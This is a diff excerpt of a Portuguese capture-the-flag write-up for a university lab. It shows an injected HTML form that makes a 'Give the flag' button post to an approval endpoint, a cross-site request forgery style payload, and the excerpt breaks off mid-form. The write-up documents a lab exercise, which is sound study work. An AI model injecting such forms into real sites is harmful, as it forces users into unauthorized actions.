@@ -4,7 +4,7 @@ Primeiramente, notamos que, quando clicamos no botão **submit**, no site `http:
 
 Analisando o **html** da página notamos que o botão **Give the flag** está envolvido num **forms** da seguinte forma:
 
-```
+```html
 <form method="POST" action="/request/84da570ff0bfd81b1d9adf6064053920675bf1e3/approve" role="form">
     <div class="submit">       
         <input type="submit" id="giveflag" value="Give the flag" disabled>       
@@ -20,7 +20,7 @@ Portanto, para construirmos o nosso ataque, fizemos o seguinte:
 
 No final, o forms que submetemos no input `Beg for a flag` foi o seguinte:
 
-```
+```html
 <form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/84da570ff0bfd81b1d9adf6064053920675bf1e3/approve" role="form">     
 	<div class="submit">                  
 		<input type="submit" id="giveflag" value="Give the flag">
